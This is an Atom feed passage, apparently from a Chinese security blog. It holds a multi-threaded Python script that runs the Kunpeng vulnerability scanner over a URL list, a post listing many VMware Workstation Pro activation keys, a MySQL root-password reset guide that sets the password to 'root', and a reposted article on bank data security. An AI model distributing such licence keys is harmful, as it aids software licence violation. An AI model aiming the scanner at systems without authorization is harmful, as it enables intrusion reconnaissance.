class="line"></span><br><span class="line"><span class="comment"># 开启日志打印</span></span><br><span class="line"><span class="comment"># kunpeng.ShowLog()</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">callback</span><span class="params">()</span>:</span></span><br><span class="line">    a = task</span><br><span class="line">    <span class="comment"># print(a)</span></span><br><span class="line">    out = kunpeng.Check(task)</span><br><span class="line">    print(a, json.loads(out))</span><br><span class="line">    <span class="comment"># print(a)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 扫描目标</span></span><br><span class="line"><span class="comment"># with open("ip.txt") as fp:</span></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">"url.txt"</span>) <span class="keyword">as</span> fp:</span><br><span class="line">    <span class="keyword">for</span> item <span class="keyword">in</span> fp.readlines():</span><br><span class="line">        <span class="comment"># print(item)</span></span><br><span class="line">        task = &#123;</span><br><span class="line">            <span class="string">'type'</span>: <span class="string">'web'</span>,  <span class="comment"># 目标类型web或者service</span></span><br><span class="line">            <span class="comment"># 'type': 'service',</span></span><br><span class="line">            <span class="string">'netloc'</span>: item.strip(), </span><br><span class="line">            <span class="string">'target'</span>: <span class="string">'all'</span></span><br><span class="line">        <span class="comment">#     "meta":&#123;</span></span><br><span class="line">        <span class="comment">#     "system": "windows",  //操作系统，部分漏洞检测方法不同系统存在差异，提供给插件进行判断</span></span><br><span class="line">        <span class="comment">#     "pathlist":[], //目录路径URL列表，部分插件需要此类信息，例如列目录漏洞插件</span></span><br><span class="line">        <span class="comment">#     "filelist":[], //文件路径URL列表，部分插件需要此类信息，例如struts2漏洞相关插件</span></span><br><span class="line">        <span class="comment">#     "passlist":[] //自定义密码字典</span></span><br><span class="line">        <span class="comment"># &#125; // 非必填</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment"># print(task)</span></span><br><span class="line">        task = _args_encode(json.dumps(task))</span><br><span class="line">        t1 = threading.Thread(target=callback)</span><br><span class="line">        </span><br><span class="line">        t1.start()</span><br></pre></td></tr></table></figure><p>url列表放到url.txt下面，开启了多线程</p><p>扫描结果</p><img src="/kunpeng/1.png" title="描述">]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;0x00-简介&quot;&gt;&lt;a href=&quot;#0x00-简介&quot; class=&quot;headerlink&quot; title=&quot;0x00 简介&quot;&gt;&lt;/a&gt;0x00 简介&lt;/h2&gt;&lt;p&gt;项目地址：&lt;a href=&quot;https://github.com/opensec-cn/kunpeng&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://github.com/opensec-cn/kunpeng&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Kunpeng是一个Golang编写的开源POC检测框架，集成了包括数据库、中间件、web组件、cms等等的漏洞POC（查看已收录POC列表），可检测弱口令、SQL注入、XSS、RCE等漏洞类型，以动态链接库的形式提供调用，通过此项目可快速对目标进行安全漏洞检测，比攻击者快一步发现风险漏洞。&lt;br&gt;
    
    </summary>
    
      <category term="web安全" scheme="http://www.pa55w0rd.club/categories/web%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="工具使用" scheme="http://www.pa55w0rd.club/tags/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/"/>
    
  </entry>
  
  <entry>
    <title>VMware Workstation pro 激活密钥</title>
    <link href="http://www.pa55w0rd.club/vmware/"/>
    <id>http://www.pa55w0rd.club/vmware/</id>
    <published>2019-03-22T09:53:50.000Z</published>
    <updated>2019-03-22T10:03:24.137Z</updated>
    
    <content type="html"><![CDATA[<p>VMware Workstation pro 激活密钥</p><p>VMware Workstation 15 Pro官方下载地址：<a href="https://www.vmware.com/cn/products/workstation-pro/workstation-pro-evaluation.html" target="_blank" rel="noopener">https://www.vmware.com/cn/products/workstation-pro/workstation-pro-evaluation.html</a></p><p>Windows各版本镜像下载：<a href="http://msdn.itellyou.cn/" target="_blank" rel="noopener">http://msdn.itellyou.cn/</a></p><p>Linux各个发行版本下载：<a href="https://opsx.alibaba.com/mirror" target="_blank" rel="noopener">https://opsx.alibaba.com/mirror</a></p><a id="more"></a><h2 id="VMware-Workstation-Pro-15-激活许可证"><a href="#VMware-Workstation-Pro-15-激活许可证" class="headerlink" title="VMware Workstation Pro 15 激活许可证"></a>VMware Workstation Pro 15 激活许可证</h2><p>UY758-0RXEQ-M81WP-8ZM7Z-Y3HDA<br>VF750-4MX5Q-488DQ-9WZE9-ZY2D6<br>UU54R-FVD91-488PP-7NNGC-ZFAX6<br>YC74H-FGF92-081VZ-R5QNG-P6RY4<br>YC34H-6WWDK-085MQ-JYPNX-NZRA2<br>VG5HH-D6E04-0889Y-QXZET-QGUC8<br>CY55A-F6G80-H85HQ-WNN5X-W38W4<br>AC11H-4HZ05-08EDQ-APQGX-YCUC8<br>ZG780-8EZ9M-M89LY-M5PEG-W2AZ8<br>ZF3NU-D6XEJ-48E7Q-27YNC-PC8ED<br>AV5M0-F4W8M-088PZ-36ZNV-NFHE2<br>AU15R-A0Z4N-M88HY-HQYNX-QYKD6<br>VY110-4RD50-H886P-5FMN9-WPUUD<br>GF302-4HW44-H88DQ-WZXNV-Q3R94<br>UA752-0KF9J-0811Y-MQNEX-ZUAGF<br>VG5HH-D6E04-0889Y-QXZET-QGUC8<br>CY55A-F6G80-H85HQ-WNN5X-W38W4<br>AC11H-4HZ05-08EDQ-APQGX-YCUC8<br>ZG780-8EZ9M-M89LY-M5PEG-W2AZ8<br>ZF3NU-D6XEJ-48E7Q-27YNC-PC8ED<br>AV5M0-F4W8M-088PZ-36ZNV-NFHE2<br>AU15R-A0Z4N-M88HY-HQYNX-QYKD6<br>VY110-4RD50-H886P-5FMN9-WPUUD<br>GF302-4HW44-H88DQ-WZXNV-Q3R94<br>UA752-0KF9J-0811Y-MQNEX-ZUAGF</p><h2 id="VMware-Workstation-Pro-14-激活许可证"><a href="#VMware-Workstation-Pro-14-激活许可证" class="headerlink" title="VMware Workstation Pro 14 激活许可证"></a>VMware Workstation Pro 14 激活许可证</h2><p>FF31K-AHZD1-H8ETZ-8WWEZ-WUUVA<br>CV7T2-6WY5Q-48EWP-ZXY7X-QGUWD</p><h2 id="VMware-Workstation-Pro-12-激活许可证"><a href="#VMware-Workstation-Pro-12-激活许可证" class="headerlink" title="VMware Workstation Pro 12 激活许可证"></a>VMware Workstation Pro 12 激活许可证</h2><p>5A02H-AU243-TZJ49-GTC7K-3C61N<br>VF5XA-FNDDJ-085GZ-4NXZ9-N20E6<br>UC5MR-8NE16-H81WY-R7QGV-QG2D8<br>ZG1WH-ATY96-H80QP-X7PEX-Y30V4<br>AA3E0-0VDE1-0893Z-KGZ59-QGAVF</p><h2 id="VMware-Workstation-12-Pro-简体中文版激活序列号："><a href="#VMware-Workstation-12-Pro-简体中文版激活序列号：" class="headerlink" title="VMware Workstation 12 Pro 简体中文版激活序列号："></a>VMware Workstation 12 Pro 简体中文版激活序列号：</h2><p>5A02H-AU243-TZJ49-GTC7K-3C61N<br>VU1XA-DGE5L-080NZ-LQNNG-MY2R8<br>YZ5N2-F4E96-485HY-4WPXV-XQ2Z8<br>YZ54H-A3G5N-4815Y-J6P79-QG0G8<br>YZ3R0-6EDE0-M89HZ-4YZEC-NUAU8</p><h2 id="VMware-Workstation-Pro-10-激活许可证"><a href="#VMware-Workstation-Pro-10-激活许可证" class="headerlink" title="VMware Workstation Pro 10 激活许可证"></a>VMware Workstation Pro 10 激活许可证</h2><p>1Z0G9-67285-FZG78-ZL3Q2-234JG<br>4C4EK-89KDL-5ZFP9-1LA5P-2A0J0<br>HY086-4T01N-CZ3U0-CV0QM-13DNU</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;VMware Workstation pro 激活密钥&lt;/p&gt;
&lt;p&gt;VMware Workstation 15 Pro官方下载地址：&lt;a href=&quot;https://www.vmware.com/cn/products/workstation-pro/workstation-pro-evaluation.html&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://www.vmware.com/cn/products/workstation-pro/workstation-pro-evaluation.html&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Windows各版本镜像下载：&lt;a href=&quot;http://msdn.itellyou.cn/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;http://msdn.itellyou.cn/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Linux各个发行版本下载：&lt;a href=&quot;https://opsx.alibaba.com/mirror&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://opsx.alibaba.com/mirror&lt;/a&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="note" scheme="http://www.pa55w0rd.club/categories/note/"/>
    
    
      <category term="note" scheme="http://www.pa55w0rd.club/tags/note/"/>
    
  </entry>
  
  <entry>
    <title>CentOS7下mysql5.7忘记root密码</title>
    <link href="http://www.pa55w0rd.club/mysql-forget-passwd/"/>
    <id>http://www.pa55w0rd.club/mysql-forget-passwd/</id>
    <published>2019-01-21T07:02:33.000Z</published>
    <updated>2019-01-21T07:26:36.877Z</updated>
    
    <content type="html"><![CDATA[<p>CentOS7下mysql5.7忘记root密码</p><h2 id="步骤一-配置文件中添加skip-grant-tables"><a href="#步骤一-配置文件中添加skip-grant-tables" class="headerlink" title="步骤一 配置文件中添加skip-grant-tables"></a>步骤一 配置文件中添加skip-grant-tables</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">vi /etc/my.cnf</span><br><span class="line"><span class="comment"># 在[mysqld]中添加skip-grant-tables</span></span><br><span class="line">    [mysqld]</span><br><span class="line">    skip-grant-tables</span><br><span class="line">    datadir=/var/lib/mysql</span><br><span class="line">    socket=/var/lib/mysql/mysql.sock</span><br></pre></td></tr></table></figure><a id="more"></a><h2 id="步骤二-重启mysql"><a href="#步骤二-重启mysql" class="headerlink" title="步骤二 重启mysql"></a>步骤二 重启mysql</h2><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">systemctl restart mysqld</span></span><br></pre></td></tr></table></figure><h2 id="步骤三-空密码登录"><a href="#步骤三-空密码登录" class="headerlink" title="步骤三 空密码登录"></a>步骤三 空密码登录</h2><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql -uroot -<span class="selector-tag">p</span> (直接点击回车，密码为空)</span><br></pre></td></tr></table></figure><h2 id="步骤四-修改root密码"><a href="#步骤四-修改root密码" class="headerlink" title="步骤四 修改root密码"></a>步骤四 修改root密码</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 选择数据库</span></span><br><span class="line">use mysql;</span><br><span class="line"><span class="comment"># 修改root密码</span></span><br><span class="line">update user <span class="built_in">set</span> authentication_string=password(<span class="string">'root'</span>) <span class="built_in">where</span> user=<span class="string">'root'</span>;</span><br><span class="line"><span class="comment"># 执行</span></span><br><span class="line">flush privileges;</span><br><span class="line"><span class="comment"># 退出</span></span><br><span class="line"><span class="built_in">exit</span>;</span><br></pre></td></tr></table></figure><h2 id="步骤五-删除-skip-grant-tables，并重启mysql服务"><a href="#步骤五-删除-skip-grant-tables，并重启mysql服务" class="headerlink" title="步骤五 删除 skip-grant-tables，并重启mysql服务"></a>步骤五 删除 skip-grant-tables，并重启mysql服务</h2>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;CentOS7下mysql5.7忘记root密码&lt;/p&gt;
&lt;h2 id=&quot;步骤一-配置文件中添加skip-grant-tables&quot;&gt;&lt;a href=&quot;#步骤一-配置文件中添加skip-grant-tables&quot; class=&quot;headerlink&quot; title=&quot;步骤一 配置文件中添加skip-grant-tables&quot;&gt;&lt;/a&gt;步骤一 配置文件中添加skip-grant-tables&lt;/h2&gt;&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;vi /etc/my.cnf&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;# 在[mysqld]中添加skip-grant-tables&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    [mysqld]&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    skip-grant-tables&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    datadir=/var/lib/mysql&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    socket=/var/lib/mysql/mysql.sock&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
    
    </summary>
    
      <category term="note" scheme="http://www.pa55w0rd.club/categories/note/"/>
    
    
      <category term="解决方法" scheme="http://www.pa55w0rd.club/tags/%E8%A7%A3%E5%86%B3%E6%96%B9%E6%B3%95/"/>
    
  </entry>
  
  <entry>
    <title>浅析商业银行数据安全保护体系建设思路（转）</title>
    <link href="http://www.pa55w0rd.club/data-sec/"/>
    <id>http://www.pa55w0rd.club/data-sec/</id>
    <published>2019-01-10T06:26:39.000Z</published>
    <updated>2019-01-16T06:37:53.318Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>转自<a href="http://blog.nsfocus.net/brief-analysis-on-the-construction-of-data-security-protection-system-in-commercial-banks/" target="_blank" rel="noopener">绿盟科技博客</a></p></blockquote><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>近年来，随着商业银行信息化的发展，信息系统越来越多的使用于日常工作，成为不可或缺的工具和手段。银行通过信息化大大提高其生产效率，从传统的柜面银行与24小时自助银行，再到手机银行，微信银行。银行的业务受理无论在空间和时间上都得到了极大的拓展，依赖于信息系统的发展而运行发展并壮大；</p><p>但是当银行正在利用信息化技术高效率的进行跨地域、跨国家的信息交流时，海量的如客户资料、营销方案、财务报表、研发数据等关乎企业核心竞争力的机密数据也随之被传输。信息技术本身的双刃剑特性也在组织网络中不断显现：强大的开放性和互通性催生了商业泄密、网络间谍等众多灰色名词，“力拓案”、“维基泄密”等事件让信息安全事件迅速升温，信息防泄密成为商业银行越来越关注的焦点。<br><a id="more"></a><br>本文结合目前数据保护技术现状及绿盟科技数据保护建设经验，对商业银行数据保护建设思路进行梳理</p><p><img src="http://blog.nsfocus.net/wp-content/uploads/2018/11/500938693_wx.jpg" alt=""></p><h2 id="商业银行数据保护的困境"><a href="#商业银行数据保护的困境" class="headerlink" title="商业银行数据保护的困境"></a>商业银行数据保护的困境</h2><h3 id="数据存在形式多、访问人员多、存储分散、易传播"><a href="#数据存在形式多、访问人员多、存储分散、易传播" class="headerlink" title="数据存在形式多、访问人员多、存储分散、易传播"></a>数据存在形式多、访问人员多、存储分散、易传播</h3><p>在商业银行内部，有海量电子数据，纸质数据，且一直处于动态增长状态，如用户基本信息，账户信息；应用系统源码，需求说明，设计说明文档：系统的用户名和密码;系统交付及规划资料：网络拓扑图、IP地址清单;安全设备的告警和自动生成的报告、日志;甚至于一些管理决策支撑信息：如银行经营状况分析报表、某分行业务经营报告、风险管理报告;市场推广活动情况、后督工作记录、拆借操作记录、贷款审批与发放记录、客户征信、董事会、股东会议等会议纪要等等。</p><p>这些数据大部分数据被分散存储在全行办公人员PC电脑中，移动存储介质中或个人邮箱中。这种分散的数据存储方式给商业银行数据保护工作带来很大的困扰，同时，人员办公又存在地域上的不集中，一旦发生数据泄露，会很快在全省及至全国范围内扩散。再者，每个机构对员工日常要求和管理的标准高低不一，人员安全意识不均衡，进一步增加了数据保护的难度。</p><h3 id="数据泄露途径多"><a href="#数据泄露途径多" class="headerlink" title="数据泄露途径多"></a>数据泄露途径多</h3><p>从数据存储侧泄露来看，这些数据被存放于办公PC，个人笔记本，个人邮箱，移动办公设备以及移动存储设备中。尤其是可移动办公设备和移动存储设备，容易因丢失或失窃发生数据泄露。</p><p>从数据泄露手段角度看，互联网邮箱，公有云网盘，WEB类应用都会成为用户存储和传播企业数据的工具。如某银行为了防止内部数据外泄，将所有办公终端U口全部进行了禁用。但其有一个办公业务应用，是内外网互通的，允许用户上传文档。为了便于日常文件传输，很多用户将大量的数据上传到了此平台。结果，这台应用服务器被攻击，上面存储的大量敏感数据被下载。</p><p>从数据泄露人员来看，商业银行内部办公人员，外部黑客，第三方外包人员以及合作单位或设备维护人员都有可能造成数据泄露。</p><h3 id="数据价值定义不明确，保护工作重点不突出"><a href="#数据价值定义不明确，保护工作重点不突出" class="headerlink" title="数据价值定义不明确，保护工作重点不突出"></a>数据价值定义不明确，保护工作重点不突出</h3><p>在有些商业银行没有明确的数据价值定义标准，或者数据价值宣传教育不到位，致使工作人员对手里掌握和拥有的数据不能进行很好的估值，自然而然，对其泄露后产生的后果也就无从评估了。2016年，沈阳某银行在其装修期间将客户资料当废品进行处理，就是一期对客户资料价值错误评估的典型案例。设想，如果该行有明确的数据价值定义和评估标准，而工作人员对此标准又很熟悉，那么在对此类资料进行处理时，就有了处理的标准，而不是随心而为。</p><p>数据价值定义不明确的另外一个弊端就是数据保护人员的工作重心不突出，采用大而全的数据安全保护策略，不但自己的工作量大，成效低，不好开展，业务人员或其他部门人员的工作效率也因此而降低，数据保护工作得不到其他部门的认可，推进十分缓慢，甚至终止。</p><h2 id="数据保护建设步骤"><a href="#数据保护建设步骤" class="headerlink" title="数据保护建设步骤"></a>数据保护建设步骤</h2><img src="/data-sec/image-19.png" title="描述"><h3 id="建立信息安全防护基础"><a href="#建立信息安全防护基础" class="headerlink" title="建立信息安全防护基础"></a>建立信息安全防护基础</h3><p>商业银行数据保护建设是信息安全防护中的一部分。因此，在进行数据安全防护建设过程中，需要商业银行有良好的信息安全防护基础，例如机房物理安全，各安全域之间的访问控制，人员安全等。并已经建立完整的信息安全组织，和信息安全策略方针。目前来讲，国内大部分商业银行之部分建立已经基本完成，也就是说，大部分商业银行已经具备建立数据安全防护体系的基础条件。</p><h3 id="建立数据安全防护体系"><a href="#建立数据安全防护体系" class="headerlink" title="建立数据安全防护体系"></a>建立数据安全防护体系</h3><p>数据安全防护体系的建设是商业银行数据安全保护的必经之路，整体规划，分步建设，有助于商业银行在逐步提高数据安全保护水平的同时避免资源的浪费，降低数据保护成本和工作难度。一般包括数据保护组织的建立，数据分类分级，数据保护控制策略制定，数据保护技术手段选取，数据全生命周期管理，以及审计与持续改进等内容。</p><h3 id="对信息流进行风险管理"><a href="#对信息流进行风险管理" class="headerlink" title="对信息流进行风险管理"></a>对信息流进行风险管理</h3><p>在商业银行数据安全防护体系建设完成后，为了更加精细的控制企业数据的流转并防止泄露，一般会建立以业务流为中心的敏感数据动态流转风险管理，进一步防止敏感数据外泄。其内容包括敏感数据分布状况调研；明确业务系统使用管理人员；确定数据流转和处理方式；并借助第三方安全机构进行数据流转各环节的风险评估，发现薄弱环节，进行加固和修复，长期持续改进等内容。</p><h2 id="数据安全防护体系建设思路"><a href="#数据安全防护体系建设思路" class="headerlink" title="数据安全防护体系建设思路"></a>数据安全防护体系建设思路</h2><h3 id="完善数据保护组织架构"><a href="#完善数据保护组织架构" class="headerlink" title="完善数据保护组织架构"></a>完善数据保护组织架构</h3><p>近年来，伴随着商业竞争的加剧，数据保护工作已经越来越得到企业的重视。随之在市场上已经产生了数据间谍这类职业，他们受雇于某个企业，对其竞争对手的数据进行针对性的窃取。在很多企业也产生了专门的部门或职位来进行单位数据保护工作，可以预见，在不久的将来，这一职位或部门将出现在越来越多的企业中。</p><p>数据保护工作涉及到商业银行各个部门及所有业务系统和全行工作人员，因此，数据保护组织的建立过程中应该充分考虑到数据保护工作的系统性，建立完备的组织架构。一般分为决策组织，管理组织，执行组织和审计组织。</p><p>决策组织职责主要有根据公司发展战略，结合企业信息安全策略方针，制定符合企业业务发展的数据保护战略方针；并授权指派管理组织开展数据保护工作；对管理组织的工作进行指导和定期检查；对审计组织反馈的问题进行督导问责和解决。</p><p>管理组织职责主要有根据企业数据保护战略方针完善企业数据保护管理制度，规划数据保护建设项目；并向决策组织定期汇报数据保护管理工作情况；对执行组织数据保护工作进行检查和指导；配合审计组织的监督和检查。</p><p>执行组织负责具体的数据保护技术工作的实施和执行；并定期向管理组织汇报，接受和配合审计组织监督和检查。</p><p>审计组织职责主要是对管理组织和执行组织日常数据保护工作进行监督和检查，并将检查结果反馈给决策组织，跟踪审计问题的解决情况等。</p><p>各组织间的关系如下图所示：</p><img src="/data-sec/image-20.png" title="描述"><h3 id="对数据进行分类分级保护"><a href="#对数据进行分类分级保护" class="headerlink" title="对数据进行分类分级保护"></a>对数据进行分类分级保护</h3><p>数据保护和信息系统保护类似，应该分等级，分类别，进行重点保护。如果一味追求大而全，密而精，必然使得数据保护工作的效果难以达到预期。这种保护工作，也不可能得到业务人员或其他部门的支持与认可，自然也就无病而终，不能长期有效的开展下去。</p><p>因此，商业银行在开展数据保护工作之前，应当有明确的数据分类依据和数据重要程序分级依据。</p><h4 id="识别现有数据"><a href="#识别现有数据" class="headerlink" title="识别现有数据"></a>识别现有数据</h4><p>数据识别方法有调研了解，技术手段收集等，一般的，为了数据分级工作的准确性，还需要结访谈调研。步骤如下：</p><p>1、向各部门分发数据收集表，了解各部门日常工作中所涉及的敏感数据类型。</p><p>2、访谈各部门，调研了解敏感信息的重要性。</p><p>根据数据收集表的内容，进行各部门的针对性访谈，了解其对自己所在部门数据重要程序的分级情况，为后期数据分级定义工作做准备。</p><p>3、通过技术手段，按照数据类型进行敏感数据存储分布调研。</p><p>依据前两步调研结果，对通过技术手段，对全网的敏感数据进行收集，分析其存储分分布情况，为后期数据保护策略定义提供依据。</p><h4 id="进行数据分类"><a href="#进行数据分类" class="headerlink" title="进行数据分类"></a>进行数据分类</h4><p>根据数据识别的结果，依据商业银行自己业务特性或自身情况进行数据分类，一般的分类依据有：</p><p>1、根据国家标准和监管要求进行数据分类</p><p>这种分类方式简单明了，但存在与商业银行自身业务不匹配或不完全匹配的情况，可能全出现分类过大或过小，存在重合或遗漏的情况。</p><p>2、参考同行业进行数据分类；</p><p>由于行业的相通性，数据分类也有一定的共同性，参考同行业进行数据分类一种简便而又高效的数据分类方式。</p><p>3、根据业务部门和管理部门的经验分类</p><p>对于业务形式比较独特的商业银行，如涉及到跨国业务，由于不同国家对数据重要程程度的认识和定义上存在区别，需要业务部门和管理部门进行数据分类时也要考虑其特殊性。</p><p>数据分类方式没有统一的标准，各商业银行可以选择一种或多种分类方式进行数据分类。但建议在进行数据分类时遵循如下原则，以保护数据分类的合理性，为后期的数据分级工作提供良好的前提保证。</p><ul><li>科学性原则</li></ul><p>分类过程中应当充分考虑数据的业务属性，同时兼顾数据的敏感性级别</p><ul><li>实用性原则</li></ul><p>数据的类目设置应与商业银行现有的管理和分类相兼容，保证员工的数据分类习惯，降低分类和数据保护的难度。</p><ul><li>稳定性原则</li></ul><p>在进行数据分类过程中，应当充分考虑未来的拓展需求，使得分类保护兼容和稳定。</p><ul><li>进行数据分级</li></ul><p>数据分级是从数据的机密性角度出发，为了满足数据保护的要求。分级过程可以单独设计;</p><p>也可以结合保密规定等内容进行;</p><p>数据分级是为了合理的进行数据保护，防止矫枉过正，防护过度，造成防护资源的浪费以及给员工日常办公带来不便，以至于员工抵抗，保护工作无法继续。</p><h3 id="制定数据保护控制策略"><a href="#制定数据保护控制策略" class="headerlink" title="制定数据保护控制策略"></a>制定数据保护控制策略</h3><p>商业银行在数据保护过程中，应当根据企业文化，业务特点和敏感数据数据面临的风险情况，对不同环境下的敏感数据设计相应的控制策略，如：敏感性标识，授权审批，信息脱敏，安全隔离。</p><h3 id="制定并推进敏感性标识策略"><a href="#制定并推进敏感性标识策略" class="headerlink" title="制定并推进敏感性标识策略"></a>制定并推进敏感性标识策略</h3><p>为了让员工在日常工作中，对所产生的数据和接触到数据的重要程度有清晰认知，制定数据敏感性标识策略，并在日常办公过程中推行。</p><p>数据敏感性标识可以根据分级重新定义标识标志，如：公开信息，内部使用，商业机密等，也可以直接按照密级进行标识。如果有多个分级定义，需要再进一步细化标识，如：公开信息，内部使用，商业机密A，商业机密AA，商业机密AAA等；</p><p>制定数据标识标志后，再依据不同类型的数据制定不同的标识策略，如：</p><p>文件，文档类：应当在封面或首页的明显位置标识其使用范围或密级以及期限；</p><p>非文件、文档类：例如源代码，数据库数据，应建立所在系统的敏感性标识台账，对所存储的数据进行标识；</p><p>信息载体：如光盘，U盘，移动硬盘等，应在介质明显位置进行标注或标签标示。</p><h3 id="制定授权审批策略"><a href="#制定授权审批策略" class="headerlink" title="制定授权审批策略"></a>制定授权审批策略</h3><p>由于内部办公的需要，数据不可避免的会在各部门或各工作人员之间进行流动，商业银行应根据企业组织特点，规范各级别敏感数据的授权审批流程。</p><h3 id="制定敏感数据脱敏策略"><a href="#制定敏感数据脱敏策略" class="headerlink" title="制定敏感数据脱敏策略"></a>制定敏感数据脱敏策略</h3><p>商业银行应制定严格的数据脱敏策略。商业银行在内部办公，第三方数据交换，测试系统开发过程中，存在大量的数据交互，如果直接使用未脱敏的数据，极有可能造成数据泄露。为此，企业应建立完整的敏感数据脱敏策略来应对数据流转过程中的泄露风险。并结合授权审批策略，强制要求只有数据脱敏，杜绝未脱敏数据泄露。</p><ul><li>制定安全隔离策略</li></ul><p>根据数据分级，敏感性标识和密级定义对不同级别的数据进行分区分级别存储。对涉及敏感信息处理的网络、操作系统、中间件，数据库，甚至业务人员的办公电脑进行物理或逻辑上的安全隔离，保证数据处理环境的安全</p><ul><li>制定第三方数据使用控制策略</li></ul><p>在商业银行业务高速发展的今天，涉及到大量的第三方外包人员或第三方公司，银行应当设置专门的控制策略来控制这部分人员的数据使用。策略设置过程中应考虑如下因素：根据不同的级别，设置对应的第三方控制要求；根据所接触数据级别，提高第三方准入门槛，缩小数据接触范围；按照“必需知道”和“最小授权”双重原则进行访问授权。并通过服务合同或协议等，明确第三方在安全和数据保密方面的责任。定期通过安全检查，外部评估等方式对第三方公司策略执行情况进行检查，确保第三方控制策略的的效执行。</p><h3 id="建立技术手段进行数据保护"><a href="#建立技术手段进行数据保护" class="headerlink" title="建立技术手段进行数据保护"></a>建立技术手段进行数据保护</h3><p>技术手段是对管理和控制策略的有效补充，同时也是确保控制策略落地的有效支撑，企业应当根据其自身业务特性和控制策略，选择有效的技术手段，来封锁各种数据泄露途径，保证数据安全。好的技术手段应该可以在数据泄露事件发生前，发生时，发生后全过程进行控制。</p><ul><li>事前预防</li></ul><p>事前预防指通过技术手段的采用，可以预防数据泄露的发生或提高数据窃取成本，从数据CIA原则出发进行技术手段设计。常见的事前预防技术手段有透明加密，数据脱敏，终端安全，加密key，磁盘加密，移动介质管控等；</p><ul><li>事中阻断</li></ul><p>事中阻断是指当数据泄露发生时，其可以识别数据泄露行为并进行阻断。常见的技术手段有网络数据防泄露系统（网络DLP），邮件数据防泄露，终端数据防泄露等。其中终端数据防泄露可以有效防护移动介质拷贝，即时通讯工具传输，截屏，录屏等手段造成的数据泄露。</p><ul><li>事后审计</li></ul><p>事后审计是指当数据泄露事件发生后，提供可追溯审计的日志，帮助技术人员进行数据泄露源头或责任人定位。常见的技术手段有数据库审计，日志审计系统以及事中阻断技术手段产生的日志。</p><h3 id="建立覆盖数据全生命周期的制度与技术手段"><a href="#建立覆盖数据全生命周期的制度与技术手段" class="headerlink" title="建立覆盖数据全生命周期的制度与技术手段"></a>建立覆盖数据全生命周期的制度与技术手段</h3><p>商业银行在设计和制定数据保护管理制度以及技术措施时，应融入和覆盖数据全生命周期的各个环节。</p><p>一般来讲，数据全生命周期包括如下几个环节：</p><ul><li>创建</li></ul><p>在数据被创建时，应当通过管理制度和技术手段强制要求数据创建者确定数据安全级别，并进行有效的安全性标识；</p><ul><li>存储</li></ul><p>在数据存储过程中，应当根据不同级别的数据采用不同的技术手段进行数据存储，敏感数据应当分环境，加密存储</p><ul><li>使用</li></ul><p>数据在流转和使用过程中，应当有明确的应用审批和记录流程，第三方人员的使用应当严格管控。</p><ul><li>传输</li></ul><p>需要异地使用数据或传输使用的，应对数据加密后进行传输，并采用加密协议，甚至专人专网进行传输，保证数据在传输过程中不被截取或窃听。</p><ul><li>销毁</li></ul><p>在数据使用完毕后，确保完善的技术和管理手段监控数据销毁过程，防止数据被恢复或有备份没有销毁，造成数据的泄露。</p><p>建立有效的审计与持续改进举措</p><p>良好的数据保护工作是一个不断改进优化，持续改进的过程。通过安全检查，审计跟踪，发现问题和解决问题，优化旧的管理制度，使用与新的数据安全形势相匹配的管理制度与技术手段，不断提高敏感信息防护水平。</p><h3 id="建立数据保护安全培训体系"><a href="#建立数据保护安全培训体系" class="headerlink" 